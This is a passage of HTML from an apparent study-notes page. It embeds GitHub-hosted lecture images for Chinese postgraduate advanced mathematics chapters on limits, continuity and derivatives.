src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/2.%E6%95%B0%E5%88%97%E6%9E%81%E9%99%90/2%E6%95%B0%E5%88%97%E6%9E%81%E9%99%90_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/2.%E6%95%B0%E5%88%97%E6%9E%81%E9%99%90/2%E6%95%B0%E5%88%97%E6%9E%81%E9%99%90_2.jpg" alt="测试"></p><ol start="3">  <li>函数极限</li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/3.%E5%87%BD%E6%95%B0%E6%9E%81%E9%99%90/3%E5%87%BD%E6%95%B0%E6%9E%81%E9%99%90_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/3.%E5%87%BD%E6%95%B0%E6%9E%81%E9%99%90/3%E5%87%BD%E6%95%B0%E6%9E%81%E9%99%90_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/3.%E5%87%BD%E6%95%B0%E6%9E%81%E9%99%90/3%E5%87%BD%E6%95%B0%E6%9E%81%E9%99%90_3.jpg" alt="测试"></p><ol start="4">  <li>无穷小和无穷大</li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/4.%E6%97%A0%E7%A9%B7%E5%B0%8F%E4%B8%8E%E6%97%A0%E7%A9%B7%E5%A4%A7/4%E6%97%A0%E7%A9%B7%E5%B0%8F%E4%B8%8E%E6%97%A0%E7%A9%B7%E5%A4%A7_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/4.%E6%97%A0%E7%A9%B7%E5%B0%8F%E4%B8%8E%E6%97%A0%E7%A9%B7%E5%A4%A7/4%E6%97%A0%E7%A9%B7%E5%B0%8F%E4%B8%8E%E6%97%A0%E7%A9%B7%E5%A4%A7_2.jpg" alt="测试"></p><ol start="5">  <li>极限的运算法则</li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/5.%E6%9E%81%E9%99%90%E7%9A%84%E8%BF%90%E7%AE%97%E6%B3%95%E5%88%99/5%E6%9E%81%E9%99%90%E7%9A%84%E8%BF%90%E7%AE%97%E6%B3%95%E5%88%99_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/5.%E6%9E%81%E9%99%90%E7%9A%84%E8%BF%90%E7%AE%97%E6%B3%95%E5%88%99/5%E6%9E%81%E9%99%90%E7%9A%84%E8%BF%90%E7%AE%97%E6%B3%95%E5%88%99_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/5.%E6%9E%81%E9%99%90%E7%9A%84%E8%BF%90%E7%AE%97%E6%B3%95%E5%88%99/5%E6%9E%81%E9%99%90%E7%9A%84%E8%BF%90%E7%AE%97%E6%B3%95%E5%88%99_3.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/5.%E6%9E%81%E9%99%90%E7%9A%84%E8%BF%90%E7%AE%97%E6%B3%95%E5%88%99/5%E6%9E%81%E9%99%90%E7%9A%84%E8%BF%90%E7%AE%97%E6%B3%95%E5%88%99_4.jpg" alt="测试"></p><ol start="6">  <li>极限存在准则 两个重要极限<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/6.%E6%9E%81%E9%99%90%E5%AD%98%E5%9C%A8%E5%87%86%E5%88%99%20%E4%B8%A4%E4%B8%AA%E9%87%8D%E8%A6%81%E6%9E%81%E9%99%90/6%E6%9E%81%E9%99%90%E5%AD%98%E5%9C%A8%E5%87%86%E5%88%99%20%E4%B8%A4%E4%B8%AA%E9%87%8D%E8%A6%81%E6%9E%81%E9%99%90_1.jpg" alt="测试">  </li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/6.%E6%9E%81%E9%99%90%E5%AD%98%E5%9C%A8%E5%87%86%E5%88%99%20%E4%B8%A4%E4%B8%AA%E9%87%8D%E8%A6%81%E6%9E%81%E9%99%90/6%E6%9E%81%E9%99%90%E5%AD%98%E5%9C%A8%E5%87%86%E5%88%99%20%E4%B8%A4%E4%B8%AA%E9%87%8D%E8%A6%81%E6%9E%81%E9%99%90_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/6.%E6%9E%81%E9%99%90%E5%AD%98%E5%9C%A8%E5%87%86%E5%88%99%20%E4%B8%A4%E4%B8%AA%E9%87%8D%E8%A6%81%E6%9E%81%E9%99%90/6%E6%9E%81%E9%99%90%E5%AD%98%E5%9C%A8%E5%87%86%E5%88%99%20%E4%B8%A4%E4%B8%AA%E9%87%8D%E8%A6%81%E6%9E%81%E9%99%90_3.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/6.%E6%9E%81%E9%99%90%E5%AD%98%E5%9C%A8%E5%87%86%E5%88%99%20%E4%B8%A4%E4%B8%AA%E9%87%8D%E8%A6%81%E6%9E%81%E9%99%90/6%E6%9E%81%E9%99%90%E5%AD%98%E5%9C%A8%E5%87%86%E5%88%99%20%E4%B8%A4%E4%B8%AA%E9%87%8D%E8%A6%81%E6%9E%81%E9%99%90_4.jpg" alt="测试"></p><ol start="7">  <li>无穷小的比较</li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/7.%E6%97%A0%E7%A9%B7%E5%B0%8F%E7%9A%84%E6%AF%94%E8%BE%83/7%E6%97%A0%E7%A9%B7%E5%B0%8F%E7%9A%84%E6%AF%94%E8%BE%83_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/7.%E6%97%A0%E7%A9%B7%E5%B0%8F%E7%9A%84%E6%AF%94%E8%BE%83/7%E6%97%A0%E7%A9%B7%E5%B0%8F%E7%9A%84%E6%AF%94%E8%BE%83_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/7.%E6%97%A0%E7%A9%B7%E5%B0%8F%E7%9A%84%E6%AF%94%E8%BE%83/7%E6%97%A0%E7%A9%B7%E5%B0%8F%E7%9A%84%E6%AF%94%E8%BE%83_3.jpg" alt="测试"></p><ol start="8">  <li>函数的连续型与间断点</li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/8.%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%80%A7%E4%B8%8E%E9%97%B4%E6%96%AD%E7%82%B9/8%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%80%A7%E5%92%8C%E9%97%B4%E6%96%AD%E7%82%B9_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/8.%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%80%A7%E4%B8%8E%E9%97%B4%E6%96%AD%E7%82%B9/8%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%80%A7%E5%92%8C%E9%97%B4%E6%96%AD%E7%82%B9_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/8.%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%80%A7%E4%B8%8E%E9%97%B4%E6%96%AD%E7%82%B9/8%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%80%A7%E5%92%8C%E9%97%B4%E6%96%AD%E7%82%B9_3.jpg" alt="测试"></p><ol start="9">  <li>连续函数运算及初等函数连续性</li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/9.%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0%E8%BF%90%E7%AE%97%E5%8F%8A%E5%88%9D%E7%AD%89%E5%87%BD%E6%95%B0%E8%BF%9E%E7%BB%AD%E6%80%A7/9%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0%E8%BF%90%E7%AE%97%E5%8F%8A%E5%88%9D%E7%AD%89%E5%87%BD%E6%95%B0%E8%BF%9E%E7%BB%AD%E6%80%A7_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/9.%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0%E8%BF%90%E7%AE%97%E5%8F%8A%E5%88%9D%E7%AD%89%E5%87%BD%E6%95%B0%E8%BF%9E%E7%BB%AD%E6%80%A7/9%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0%E8%BF%90%E7%AE%97%E5%8F%8A%E5%88%9D%E7%AD%89%E5%87%BD%E6%95%B0%E8%BF%9E%E7%BB%AD%E6%80%A7_2.jpg" alt="测试"></p><ol start="10">  <li>闭区间上连续函数的性质<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/10.%E9%97%AD%E5%8C%BA%E9%97%B4%E4%B8%8A%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0%E7%9A%84%E6%80%A7%E8%B4%A8/10%E9%97%AD%E5%8C%BA%E9%97%B4%E4%B8%8A%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0%E7%9A%84%E6%80%A7%E8%B4%A8_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/10.%E9%97%AD%E5%8C%BA%E9%97%B4%E4%B8%8A%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0%E7%9A%84%E6%80%A7%E8%B4%A8/10%E9%97%AD%E5%8C%BA%E9%97%B4%E4%B8%8A%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0%E7%9A%84%E6%80%A7%E8%B4%A8_2.jpg" alt="测试">  </li></ol><h3 id="第二章、导数与微分"><a href="#第二章、导数与微分" class="headerlink" title="第二章、导数与微分"></a>第二章、导数与微分</h3><ol>  <li>    <p>导数的概念<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/1.%E5%AF%BC%E6%95%B0%E7%9A%84%E6%A6%82%E5%BF%B5/1%E5%AF%BC%E6%95%B0%E7%9A%84%E6%A6%82%E5%BF%B5_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/1.%E5%AF%BC%E6%95%B0%E7%9A%84%E6%A6%82%E5%BF%B5/1%E5%AF%BC%E6%95%B0%E7%9A%84%E6%A6%82%E5%BF%B5_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/1.%E5%AF%BC%E6%95%B0%E7%9A%84%E6%A6%82%E5%BF%B5/1%E5%AF%BC%E6%95%B0%E7%9A%84%E6%A6%82%E5%BF%B5_3.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/1.%E5%AF%BC%E6%95%B0%E7%9A%84%E6%A6%82%E5%BF%B5/1%E5%AF%BC%E6%95%B0%E7%9A%84%E6%A6%82%E5%BF%B5_4.jpg" alt="测试">    </p>  </li>  <li>    <p>求导法则(一)</p>  </li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/2.%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99%EF%BC%88%E4%B8%80%EF%BC%89/2%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99(%E4%B8%80)_1.jpg" alt="测试">_  <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/2.%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99%EF%BC%88%E4%B8%80%EF%BC%89/2%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99(%E4%B8%80)_2.jpg" alt="测试">_  <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/2.%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99%EF%BC%88%E4%B8%80%EF%BC%89/2%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99(%E4%B8%80)_3.jpg" alt="测试">_</p><ol start="3">  <li>    <p>求导法则(二)<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/3.%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99%EF%BC%88%E4%BA%8C%EF%BC%89/3%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99(%E4%BA%8C)_1.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/3.%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99%EF%BC%88%E4%BA%8C%EF%BC%89/3%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99(%E4%BA%8C)_2.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/3.%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99%EF%BC%88%E4%BA%8C%EF%BC%89/3%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99(%E4%BA%8C)_3.jpg" alt="测试">_    </p>  </li>  <li>    <p>高阶导数<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/4.%E9%AB%98%E9%98%B6%E5%AF%BC%E6%95%B0/4%E9%AB%98%E9%98%B6%E5%AF%BC%E6%95%B0_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/4.%E9%AB%98%E9%98%B6%E5%AF%BC%E6%95%B0/4%E9%AB%98%E9%98%B6%E5%AF%BC%E6%95%B0_2.jpg" alt="测试"><br><img 